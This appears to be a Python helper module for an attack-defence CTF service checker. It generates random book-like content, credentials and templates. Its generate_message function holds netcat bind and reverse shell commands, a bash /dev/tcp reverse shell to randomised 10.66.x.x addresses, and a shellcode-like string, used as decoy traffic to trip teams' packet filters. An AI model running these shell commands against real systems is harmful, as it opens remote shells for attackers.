import random
import os
import base64
import string
import logging
from ctf_gameserver import checkerlib
from files.data import *
import traceback
import requests
import time
import urllib3

DIR_PATH = os.path.dirname(os.path.realpath(__file__))

class CheckerException(Exception):
    def __init__(self, message, session=None):
        self.message = message
        self.session = session

    def __str__(self):
        return self.message

def handle_errors(checkres=checkerlib.CheckResult.FAULTY):
    def decorator(func):
        def wrapper_handle_errors(*args, **kwargs):
            max_attempts = 2
            for attempt in range(max_attempts):
                try:
                    t1 = time.time()
                    result = func(*args, **kwargs)
                    t2 = time.time()
                    logging.info(f"Executed {func.__name__} in {t2-t1}s")
                    return result if result is not None else checkerlib.CheckResult.OK
                except CheckerException as e:
                    logging.error(e.message)
                    if e.session:
                        e.session.close()
                    return checkres
                except requests.exceptions.ConnectionError as e:
                    logging.warning("Connection dropped (attempt %d/%d): %s",
                                    attempt + 1, max_attempts, e)
                    if attempt + 1 == max_attempts:
                        return checkerlib.CheckResult.DOWN
                    continue
                except TimeoutError as e:
                    logging.error("Connection timed out")
                    logging.error(e)
                    return checkerlib.CheckResult.DOWN
                except urllib3.exceptions.ReadTimeoutError as e:
                    logging.error("Connection timed out")
                    logging.error(e)
                    return checkerlib.CheckResult.DOWN
                except Exception as e:
                    logging.error("Unhandled Exception")
                    logging.error(e)
                    traceback.print_exception(e)
                    return checkres
        return wrapper_handle_errors
    return decorator

def generate_message():
    "returns a string that hopefully triggers some packet filtering"

    return random.choice([
        os.urandom(random.randint(4, 128)).hex(),
	base64.b64encode(os.urandom(random.randint(4, 128))).decode(),
        r"TX-3399-Purr-!TTTP\%JONE%501:-%mm4-%mm%--DW%P-Yf1Y-fwfY-yzSzP-iii%-Zkx%-%Fw%P-XXn6- 99w%-ptt%P-%w%%-qqqq-jPiXP-cccc-Dw0D-WICzP-c66c-W0TmP-TTTT-%NN0-%o42-7a-0P-xGGx-rrrx- aFOwP-pApA-N-w--B2H2PPPPPPPPPPPPPPPPPPPPPP",
	'Never gonna give you up, never gonna let you down',
      	'/bin/sh -c "/bin/{} -l -p {} -e /bin/sh"'.format(random.choice(['nc', 'ncat', 'netcat']), random.randint(1024, 65535)),
	'/bin/sh -c "/bin/{} -e /bin/sh 10.66.{}.{} {}"'.format(random.choice(['nc', 'ncat', 'netcat']), random.randint(1024, 65535), random.randint(0,255), random.randint(0,255), random.randint(1024, 65535)),
	'/bin/bash -i >& /dev/tcp/10.66.{}.{}/{} 0>&1'.format(random.randint(0,255), random.randint(0,255), random.randint(1024, 65535)),
    ])

def generate_text():
    LETTERS = "abcdefgijlmnoqsuvwxyz"
    sentence = ""
    for i in range(random.randint(4,8)):
        for j in range(random.randint(4,8)):
            sentence += random.choice(LETTERS)
        sentence += " "
    for j in range(random.randint(4,8)):
        sentence += random.choice(LETTERS)
    sentence += "."

    words = sentence.split()
    if len(words) >= 2:
        words[0], words[1] = words[1], words[0]

    return (sentence, " ".join(words))


def generate_creds(unamelen=8, pwlen=8):
    uname = "".join([random.choice(string.ascii_letters) for _ in range(unamelen)])
    pw = "".join([random.choice(string.ascii_letters) for _ in range(pwlen)])
    return (uname, pw)


def random_author():
    return random.choice([
        generate_message().replace("\"","").replace("\\",""),
        f"{random.choice(FIRST_NAME)}",
        f"{random.choice(FIRST_NAME)} {random.choice(LAST_NAME)}",
        f"{random.choice(FIRST_NAME)} {random.choice(MIDDLE_NAME)} {random.choice(LAST_NAME)}"
        ])
    

def random_title():
    return random.choice([
        f"{random.choice(TITLE_MAIN)}",
        f"{random.choice(TITLE_PRE)} {random.choice(TITLE_MAIN)}",
        ])

def random_text():
    with open(f"{DIR_PATH}/files/sentences.txt", "rb") as file:
        file.seek(random.randrange(336947))
        file.readline()
        n = random.randint(8, 24)
        sentences = []
        for _ in range(n):
            sentences.append(file.readline().decode().rstrip())
        return "".join(sentences)


def random_chapter():
    return random.choice([
        generate_message(),
        "",
        "Happy birthday Trixter!",
        random_text()
        ]).replace("\"", "").replace("\\", "")

def random_template():
    template = random.choice(os.listdir(f"{DIR_PATH}/files/single_files"))
    logging.info(f"Chose template {template}")
    with open(f"{DIR_PATH}/files/single_files/{template}", "r") as file:
        template_data = file.read()
    author = random_author()
    title = random_title()
    chapters = [random_chapter() for _ in range(3)]
    t = string.Template(template_data)
    return (template, t.substitute(author=author, title=title, chap1=chapters[0], chap2=chapters[1], chap3=chapters[2]), title)

def random_multi_template():
    template = random.choice(os.listdir(f"{DIR_PATH}/files/multi_files"))
    logging.info(f"Chose template {template}")
    with open(f"{DIR_PATH}/files/multi_files/{template}", "r") as file:
        template_data = file.read()
    author = random_author()
    title = random_title()
    chapters = [random_chapter() for _ in range(3)]
    t = string.Template(template_data)
    return (template, t.substitute(author=author, title=title, chap1=chapters[0], chap2=chapters[1], chap3=chapters[2]), title)

def random_image():
    image = random.choice(os.listdir(f"{DIR_PATH}/files/images"))
    logging.info(f"Chose image {image}")
    with open(f"{DIR_PATH}/files/images/{image}", "rb") as file:
        image_data = file.read()
    return (image, image_data)

